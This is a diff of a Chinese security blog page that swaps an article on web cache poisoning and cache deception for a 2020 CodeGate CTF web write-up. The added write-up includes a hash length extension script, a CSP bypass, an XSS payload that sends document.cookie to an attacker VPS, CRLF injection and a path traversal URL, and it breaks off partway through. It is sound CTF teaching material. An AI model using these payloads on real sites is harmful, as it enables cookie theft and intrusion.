@@ -22,7 +22,7 @@
     <meta name="description" content="苟有恒，何必三更眠五更起。">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>Web缓存利用分析(一) · Sky&#39;s blog</title>
+    <title>2020 CodeGate Web Writeup · Sky&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >Sky&#39;s blog</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">Web缓存利用分析(一)</a>
+                <a href="#" class="post-name">2020 CodeGate Web Writeup</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            Web缓存利用分析(一)
+            2020 CodeGate Web Writeup
             <!-- 404 -->
             
         </h1>
@@ -272,12 +272,12 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1,997</span>阅读时长: <span class="post-count reading-time">7 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1,713</span>阅读时长: <span class="post-count reading-time">9 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2020/01/14</span>
+                    <span class="post-intro-time">2020/02/09</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -401,30 +401,37 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近看到一些Web Cache方面的攻击，于是总结了一下，内容如下。</p>
-<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>Cache是一种经典的用空间换时间的做法，其应用场景非常广泛，而本篇文章的聚焦点仅在于Web领域上，对于DNS等基础设施的相关cache攻击，也不在此讨论。<br>那么我们可以大致将Web Cache攻击分为2类：</p>
-<ul>
-<li>User Browser Cache</li>
-<li>Web Server Cache<br>对于浏览器，我们知道在请求网站时，会遇到js，css，图片等等的加载，如果每次请求都加载一次，那么可能会消耗许多时间，因此浏览器中可引入Cache机制，用以缓存这些静态资源，以加快访问速度。<br>对于服务器，可能某个网站页面每天要被数以万计的人访问，那么如果每次都处理一次同样的请求，则会消耗大量服务器的资源，因此服务器缓存也显得尤为重要，其中CDN就是Web Server Cache的一个典例：<br><img src="./_image/2020-05-07/2020-05-07-15-40-45.png" alt=""><br>例如访问链接:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/index.html</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>在第一个人访问后，其页面response将会被CDN缓存，下一个请求者则会直接从CDN获取response，以此减轻服务器处理请求的压力，同时达到了防止Dos攻击的目的。如下图示例：<br><img src="./_image/2020-05-07/2020-05-07-15-41-57.png" alt=""><br>CDN不仅能起到防止Dos的作用，还能加快我们的请求速度，例如我们访问服务器，请求首先会被CDN处理，计算出response给我们的最优ip地址。举一个简单的例子，就好比原来只有北京一个车站卖票，南京的想要买票就要千里迢迢前往北京，而如今有了CDN就好比在南京也有卖票点，如此一来，省时省力，不仅减轻了北京卖票点的压力，也方便了顾客。<br>但凡是皆有利有弊，如果Cache被攻击者利用，也可以产生一些严重的攻击，本篇文章中，我们则聚焦于以下3种攻击：</p>
-<ul>
-<li>User Browser Cache Poisoning</li>
-<li>Server Cache Poisoning</li>
-<li>Web Cache Deception</li>
-</ul>
-<h2 id="User-Browser-Cache-Poisoning"><a href="#User-Browser-Cache-Poisoning" class="headerlink" title="User Browser Cache Poisoning"></a>User Browser Cache Poisoning</h2><p>对于浏览器缓存投毒，那么很好理解，其应该是影响浏览器缓存的文件，将其污染以达到攻击目的。那么可能被污染的文件有哪些呢？我们之前提过，浏览器一般缓存静态资源，那么攻击者的攻击目标也就是诸如JS、CSS的静态资源了。<br>这种攻击会产生什么样的危害呢？<br><img src="./_image/2020-05-07/2020-05-07-15-46-49.png" alt=""><br><img src="./_image/2020-05-07/2020-05-07-15-46-59.png" alt=""><br>我们可以看到，一旦我们的浏览器缓存资源被污染，当我们请求网站时，应用了污染的静态资源，则会产生xss一类的攻击。但这种攻击持久性会随缓存时间的到期而终止，又或者用户勤清缓存而解除。<br>但这样一种攻击是如何实现的呢？我们可以看下图：<br><img src="./_image/2020-05-07/2020-05-07-15-48-41.png" alt=""><br>当攻击者和受害者处于同一WiFi下，攻击者可以利用一些攻击手段，让自己成为受害者的代理，而当受害者请求目标网站资源时，攻击者可在中间修改。当目标网站response需要缓存的资源时，攻击者可将其替换为自己篡改的同名文件，以达到污染浏览器缓存的目的。<br>但考虑到缓存存在时效性，如果目标网站认为缓存过期，则污染缓存就会失效，因此如何最大化污染缓存时间成为一个新的问题，但这里我们可以采用如下做法：<br><img src="./_image/2020-05-07/2020-05-07-15-51-13.png" alt=""><br>我们可以首先对一些知名网站进行分析，查看他们缓存时间最长的文件，以决定我们污染文件的文件名。那么如何知道缓存时间呢？我们可利用Http Header的如下属性来查看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache-Control : max-age=1000</span><br></pre></td></tr></table></figure></p>
-<p>如此一来即可水到渠成，进行用户浏览器污染。工具如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/EtherDream/mitm-http-cache-poisoning.git</span><br></pre></td></tr></table></figure></p>
-<h2 id="Server-Cache-Poisoning"><a href="#Server-Cache-Poisoning" class="headerlink" title="Server Cache Poisoning"></a>Server Cache Poisoning</h2><p>在介绍完用户浏览器投毒后，我们再来看一下服务器缓存投毒。之前我们有说过，服务器会缓存某个链接的第一个访问者的response内容，那么如果第一个人是攻击者，就很有可能让CDN错误的缓存污染内容，达成攻击：<br><img src="./_image/2020-05-07/2020-05-07-15-55-04.png" alt=""><br>但是服务器是如何判断2个请求者请求的是不是同一个页面呢？这里就要引入Cache Key的概念：<br><img src="./_image/2020-05-07/2020-05-07-15-55-41.png" alt=""><br>如上请求，服务器会判断橙色字部分，看其是否相同，若相同则对应同一个cache，但我们不难发现蓝色字体部分，此时2个访问者的response理应不同，因为他们对应的不同语言，但因为缓存机制的问题，导致第2个请求者看到了错误语言的页面。<br>再同理，我们看如下请求：<br><img src="./_image/2020-05-07/2020-05-07-15-57-27.png" alt=""><br>我们发现response页面中会拼接X-Forwarded-Host，那么假设我们是第一个请求者，此response将会被缓存，那么当下一个请求者再次访问如下链接：<br><img src="./_image/2020-05-07/2020-05-07-15-57-36.png" alt=""><br>很显然其将受到xss的攻击。<br>但是此类攻击有一个前提，即我们需要是第一个请求某个页面的人，那么如何做到这一点呢？<br><img src="./_image/2020-05-07/2020-05-07-15-59-50.png" alt=""><br>我们可以利用response里的Age和max-age，Age代表当前response的时间，而max-age代表该页面缓存何时会过期，以此我们即可计算出投毒时机。<br>那么如何保护网站免收此类攻击呢？这就要和我们之前提到的cache key有关，我们看如下请求：<br><img src="./_image/2020-05-07/2020-05-07-16-01-38.png" alt=""><br>如果我们利用Vary指定Cache Key为User-Agent，那么不仅需要2个访问者请求域名和url相同，同时需要2人拥有同样的User-Agent，才会命中同一块cache。</p>
-<h2 id="Web-Cache-Deception"><a href="#Web-Cache-Deception" class="headerlink" title="Web Cache Deception"></a>Web Cache Deception</h2><p>在说完Web Server缓存投毒后，我们再来看一下Web缓存欺骗。相较于前两种攻击，该攻击更为普遍，利用也相对容易。不乏其在CTF中出现的频频身影。<br><img src="./_image/2020-05-07/2020-05-07-16-04-13.png" alt=""><br>我们看如上案例，我们可以诱导管理员访问链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.2.122.1/secret.php/test.css</span><br></pre></td></tr></table></figure></p>
-<p>而服务器在处理该链接时，由于test.css不存在，其会向前解析，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.2.122.1/secret.php</span><br></pre></td></tr></table></figure></p>
-<p>此时response页面即为secret.php的页面内容，而CDN对此不知，其认为当请求链接为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.2.122.1/secret.php/test.css</span><br></pre></td></tr></table></figure></p>
-<p>response应为管理员的secret.php页面内容。<br>而后攻击者再次请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.2.122.1/secret.php/test.css</span><br></pre></td></tr></table></figure></p>
-<p>CDN将作出响应，将管理员的secret.php页面内容返回，造成信息泄露。<br>那么此种攻击在2019 CyBRICS CTF Quals或2019 XCTF Final都有出现，我们以2019 CyBRICS CTF Quals的一道题为例：<br><img src="./_image/2020-05-07/2020-05-07-16-10-07.jpg" alt=""><br>题目预设了request功能，同时注意到其http header：<br><img src="./_image/2020-05-07/2020-05-07-16-10-43.jpg" alt=""><br>同时结合题目提示：cache is vulnerabilities，那么可以判断此处应该为Web缓存欺骗的情况。<br>我们需要利用request功能，让其去请求flag页面，再利用缓存信息将内容带出。<br>因此我们首先可以读取主页内容，这里构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://95.179.190.31/index.php/skyiscool.js</span><br></pre></td></tr></table></figure></p>
-<p>此时缓存将会将此url记录，对应内容则为index.php的内容。<br>然后我们再次访问该链接，即可获取index.php内容：<br><img src="./_image/2020-05-07/2020-05-07-16-12-38.jpg" alt=""><br>那么再让题目携带csrf-token去请求flag即可：<br><img src="./_image/2020-05-07/2020-05-07-16-13-04.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://95.179.190.31/index.php/skyiscool.js?csrf-token=b04d2bc2f3d3654947ba82d59a2b367630743d3447dbc0af46182359f166c4bd%26flag=1</span><br></pre></td></tr></table></figure></p>
-<p>此时再请求缓存页面，即可获取flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cybrics&#123;Bu9s_C4N_83_uN1N73Nd3D!&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://drops.xmd5.com/static/drops/tips-9947.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-9947.html</a><br><a href="https://skysec.top/2019/07/22/CyBRICS-CTF-Quals-2019-Web-Writeup/#Fixaref">https://skysec.top/2019/07/22/CyBRICS-CTF-Quals-2019-Web-Writeup/#Fixaref</a><br><a href="https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack-wp.pdf</a><br><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Kettle-Practical-Web-Cache-Poisoning-Redefining-Unexploitable.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Kettle-Practical-Web-Cache-Poisoning-Redefining-Unexploitable.pdf</a></p>
+        <h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><p>随手尝试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">110.10.147.166/view.php?name=123&amp;p1=456&amp;p2=789</span><br></pre></td></tr></table></figure></p>
+<p>得到如下url:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api.php?sig=43bb08065a4d2217ca3881e93c65276b&amp;q=TVRJeixORFUyLE56ZzU=</span><br></pre></td></tr></table></figure></p>
+<p>不难发现，view.php的功能，是帮助我们把name、p1、p2转化格式后，发送给api.php。<br>其中q的值为：<br><img src="./_image/2020-02-09/2020-02-09-15-44-51.png" alt=""><br>同时存在一个report功能：<br><img src="./_image/2020-02-09/2020-02-09-15-47-06.png" alt=""><br>如果把api.php的payload传过去，就能触发XSS，但是考虑到题目有CSP：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;none&apos;; base-uri &apos;none&apos;;</span><br></pre></td></tr></table></figure></p>
+<p>显然需要bypass CSP，此时我们关注到api.php的代码实现：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$apis = explode(<span class="string">"|"</span>, $api_string);</span><br><span class="line"><span class="keyword">foreach</span>($apis <span class="keyword">as</span> $s) &#123;</span><br><span class="line">    $info = explode(<span class="string">","</span>, $s);</span><br><span class="line">    <span class="keyword">if</span>(count($info) != <span class="number">3</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    $n = base64_decode($info[<span class="number">0</span>]);</span><br><span class="line">    $p1 = base64_decode($info[<span class="number">1</span>]);</span><br><span class="line">    $p2 = base64_decode($info[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($n === <span class="string">"header"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(strlen($p1) &gt; <span class="number">10</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(strpos($p1.$p2, <span class="string">":"</span>) !== <span class="keyword">false</span> || strpos($p1.$p2, <span class="string">"-"</span>) !== <span class="keyword">false</span>) <span class="comment">//Don't trick...</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        header(<span class="string">"$p1: $p2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ($n === <span class="string">"cookie"</span>) &#123;</span><br><span class="line">        setcookie($p1, $p2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ($n === <span class="string">"body"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/&lt;.*&gt;/"</span>, $p1))</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">echo</span> $p1;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"\n&lt;br /&gt;\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ($n === <span class="string">"hello"</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hello, World!\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>我们可以利用header进行bypass csp，但是需要同时对body传入exp,而view.php只能处理单个元组，不能同时为我们签名header和body：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header,p1(b64),p2(b64)|body,p1(b64),p2(b64) ...</span><br></pre></td></tr></table></figure></p>
+<p>所以我们需要自己根据算法构造sig，考虑到api.php的检测方式：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">"q"</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">"sig"</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"?"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$api_string = base64_decode($_GET[<span class="string">"q"</span>]);</span><br><span class="line">$sig = $_GET[<span class="string">"sig"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(md5($salt.$api_string) !== $sig)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"??"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>发现我们可以尝试hash长度拓展攻击，首先我们已有一个元组和签名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=123,p1=456,p2=789</span><br><span class="line">sig=43bb08065a4d2217ca3881e93c65276b</span><br></pre></td></tr></table></figure></p>
+<p>但是我们未知salt的长度，那么需要进行爆破：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">old_sig = <span class="string">"43bb08065a4d2217ca3881e93c65276b"</span></span><br><span class="line">old_data = <span class="string">"MTIz,NDU2,Nzg5"</span> <span class="comment"># 123 456 789</span></span><br><span class="line">url = <span class="string">"http://110.10.147.166/api.php?sig=%s&amp;q=%s"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    result = hashpumpy.hashpump(old_sig, old_data, <span class="string">"|Nzg5,NDU2,MTIz"</span>, i)  <span class="comment"># 789 456 123</span></span><br><span class="line">    new_sig = result[<span class="number">0</span>]</span><br><span class="line">    new_data = base64.b64encode(result[<span class="number">1</span>])</span><br><span class="line">    now_url = url % (new_sig,new_data)</span><br><span class="line">    r = requests.get(now_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'??'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.content:</span><br><span class="line">    	<span class="keyword">print</span> i</span><br><span class="line">    	<span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
+<p>运行可得，salt长度为12。<br>那么此时可以并行构造header和body，但是如何bypass csp呢？<br>由于不擅XSS，赛后请教了一下Melody师傅,得知可用404进行bypass：<br><img src="./_image/2020-02-09/2020-02-09-16-28-01.png" alt=""><br>参考link：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.yulegeyu.com/2018/07/15/CSP-unsafe-inline%E6%97%B6-%E5%BC%95%E5%85%A5%E5%A4%96%E9%83%A8js/</span><br></pre></td></tr></table></figure></p>
+<p><img src="./_image/2020-02-09/2020-02-09-16-37-54.png" alt=""><br>得到:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api.php?sig=fa74cda5bdd2f4da4170e064a5462449&amp;q=YUdWaFpHVnksU0ZSVVVDOHhJRFF3TkE9PSxjMnQ1YzJWag==</span><br></pre></td></tr></table></figure></p>
+<p><img src="./_image/2020-02-09/2020-02-09-16-20-27.png" alt=""><br>构造：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_exp</span><span class="params">(a,b,c)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> base64.b64encode(a)+<span class="string">','</span>+base64.b64encode(b)+<span class="string">','</span>+base64.b64encode(c)</span><br><span class="line"></span><br><span class="line">old_sig = <span class="string">"fa74cda5bdd2f4da4170e064a5462449"</span></span><br><span class="line">old_data = base64.b64decode(<span class="string">'YUdWaFpHVnksU0ZSVVVDOHhJRFF3TkE9PSxjMnQ1YzJWag=='</span>)  <span class="comment">#header,HTTP/1 404,skysec</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://110.10.147.166/api.php?sig=%s&amp;q=%s"</span></span><br><span class="line"></span><br><span class="line">a = <span class="string">'body'</span></span><br><span class="line">b = <span class="string">'''&lt;img src=x onerror="location.href='//vps:23334/?c='+escape(document.cookie);"</span></span><br><span class="line"><span class="string">&gt;'''</span></span><br><span class="line">c = <span class="string">''</span></span><br><span class="line">exp = <span class="string">'|'</span>+gen_exp(a,b,c)</span><br><span class="line">result = hashpumpy.hashpump(old_sig, old_data, exp, <span class="number">12</span>)</span><br><span class="line">new_sig = result[<span class="number">0</span>]</span><br><span class="line">new_data = base64.b64encode(result[<span class="number">1</span>])</span><br><span class="line">now_url = url % (new_sig,new_data)</span><br><span class="line"><span class="keyword">print</span> now_url</span><br></pre></td></tr></table></figure></p>
+<p>得到exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://110.10.147.166/api.php?sig=812ada09f5d2713a436156061126977d&amp;q=YUdWaFpHVnksU0ZSVVVDOHhJRFF3TkE9PSxjMnQ1YzJWaoAAAAAAAAAAAABwAQAAAAAAAHxZbTlrZVE9PSxQR2x0WnlCemNtTTllQ0J2Ym1WeWNtOXlQU0pzYjJOaGRHbHZiaTVvY21WbVBTY3ZMekV3Tmk0eE5DNHhNVFF1TVRJM09qSXpNek0wTHo5alBTY3JaWE5qWVhCbEtHUnZZM1Z0Wlc1MExtTnZiMnRwWlNrN0lnbyss</span><br></pre></td></tr></table></figure></p>
+<p><img src="./_image/2020-02-09/2020-02-09-16-55-48.png" alt=""><br>得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CODEGATE2020&#123;CSP_m34n5_Content-Success-Policy_n0t_Security&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="renderer"><a href="#renderer" class="headerlink" title="renderer"></a>renderer</h2><h3 id="XFF可控"><a href="#XFF可控" class="headerlink" title="XFF可控"></a>XFF可控</h3><p><img src="./_image/2020-02-09/2020-02-09-11-31-39.png" alt=""><br>题目给予了一个路由，尝试访问后发现，XFF可控：<br><img src="./_image/2020-02-09/2020-02-09-11-32-10.png" alt=""><br>但是fuzz后发现，好像并不能直接利用。</p>
+<h3 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h3><p>后续关注到题目给予了dockerfile：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">FROM python:2.7.16</span><br><span class="line"></span><br><span class="line">ENV FLAG CODEGATE2020&#123;**DELETED**&#125;</span><br><span class="line"></span><br><span class="line">RUN apt-get update</span><br><span class="line">RUN apt-get install -y nginx</span><br><span class="line">RUN pip install flask uwsgi</span><br><span class="line"></span><br><span class="line">ADD prob_src/src /home/src</span><br><span class="line">ADD settings/nginx-flask.conf /tmp/nginx-flask.conf</span><br><span class="line"></span><br><span class="line">ADD prob_src/static /home/static</span><br><span class="line">RUN chmod 777 /home/static</span><br><span class="line"></span><br><span class="line">RUN mkdir /home/tickets</span><br><span class="line">RUN chmod 777 /home/tickets</span><br><span class="line"></span><br><span class="line">ADD settings/run.sh /home/run.sh</span><br><span class="line">RUN chmod +x /home/run.sh</span><br><span class="line"></span><br><span class="line">ADD settings/cleaner.sh /home/cleaner.sh</span><br><span class="line">RUN chmod +x /home/cleaner.sh</span><br><span class="line"></span><br><span class="line">CMD [&quot;/bin/bash&quot;, &quot;/home/run.sh&quot;]</span><br></pre></td></tr></table></figure></p>
+<p>同时注意到其用urllib完成了request功能：<br><img src="./_image/2020-02-09/2020-02-09-11-27-45.png" alt=""><br>那么尝试使用CVE，探测是否存在CRLF注入：CVE-2019-9947，发现其漏洞范围为2.x ~ 2.7.16刚好符合dockerfile中的版本号，于是进行尝试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[vps-ip]:23333?%0d%0apayload%0d%0apadding</span><br></pre></td></tr></table></figure></p>
+<p><img src="./_image/2020-02-09/2020-02-09-11-30-42.png" alt=""><br>发现确实存在CRLF注入攻击。<br>进一步尝试，利用CLRF注入，访问题目的whatismyip功能：<br><img src="./_image/2020-02-09/2020-02-09-11-52-39.png" alt=""><br>发现确实可以进行127.0.0.1的伪造访问，并且可控XFF，但陷入僵局。</p>
+<h3 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h3><p>赛后得知，题目可以进行目录穿越，进行任意文件下载：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://58.229.253.144/static../src/app/routes.py</span><br></pre></td></tr></table></figure></p>
+<p>审计代码发现：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@front.route("/admin", methods=["GET"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_access</span><span class="params">()</span>:</span></span><br><span class="line">    ip = get_ip()</span><br><span class="line">    rip = get_real_ip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">"127.0.0.1"</span>, <span class="string">"127.0.0.2"</span>]: <span class="comment">#super private ip :)</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip != rip: <span class="comment">#if use proxy</span></span><br><span class="line">        ticket = write_log(rip)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">"admin_remote.html"</span>, ticket = ticket)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> ip == <span class="string">"127.0.0.2"</span> <span class="keyword">and</span> request.args.get(<span class="string">"body"</span>):</span><br><span class="line">            ticket = write_extend_log(rip, request.args.get(<span class="string">"body"</span>))</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"admin_local.html"</span>, ticket = ticket)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">"admin_local.html"</span>, ticket = <span class="keyword">None</span>)</span><br></pre></td></tr></table></figure></p>
+<p>我们可以利用其中代码对log写入内容:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ip != rip: <span class="comment">#if use proxy</span></span><br><span class="line">    ticket = write_log(rip)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"admin_remote.html"</span>, ticket = ticket)</span><br></pre></td></tr></table></figure></p>
+<p>而跟进rip，其赋值来自于：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip = get_real_ip()</span><br></pre></td></tr></table></figure></p>
